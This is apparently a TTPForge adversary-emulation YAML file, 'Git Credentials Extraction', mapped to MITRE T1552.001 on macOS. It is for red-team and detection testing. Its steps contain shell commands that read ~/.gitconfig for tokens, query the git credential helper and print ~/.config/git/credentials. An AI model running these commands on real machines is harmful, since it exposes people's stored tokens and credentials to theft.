---
api_version: 2.0
uuid: f421f39d-38d8-483f-afb5-29df2d680b93
name: Git Credentials Extraction
authors:
- TTPForge
description: |
  Extract stored git credentials and token configurations
mitre:
  tactics:
  - TA0006 Credential Access
  techniques:
  - T1552 Unsecured Credentials
  subtechniques:
  - 'T1552.001 Unsecured Credentials: Credentials In Files'
requirements:
  platforms:
  - os: darwin
args:
- name: git_config_dir
  description: Directory containing git configuration
  type: string
  default: ~/.config/git
- name: output_file
  description: File to store extracted credentials
  type: string
  default: /tmp/git_creds.txt
steps:
- name: Check Git Config
  inline: test -d {{ .Args.git_config_dir }} && echo 'Git config directory found' || test -f ~/.gitconfig && echo 'Global
    gitconfig found'
- name: Read Global Git Config
  inline: cat ~/.gitconfig 2>/dev/null | grep -E 'user|email|token' | head -20 || echo 'No git config'
- name: Check Credentials Helper
  inline: git config --global credential.helper 2>/dev/null || echo 'No credentials helper configured'
- name: Query Git Credentials
  inline: cat ~/.config/git/credentials 2>/dev/null || echo 'No stored credentials'
  cleanup:
    inline: rm -f {{ .Args.output_file }}
tests:
- name: dry_run_test
  dry_run: true
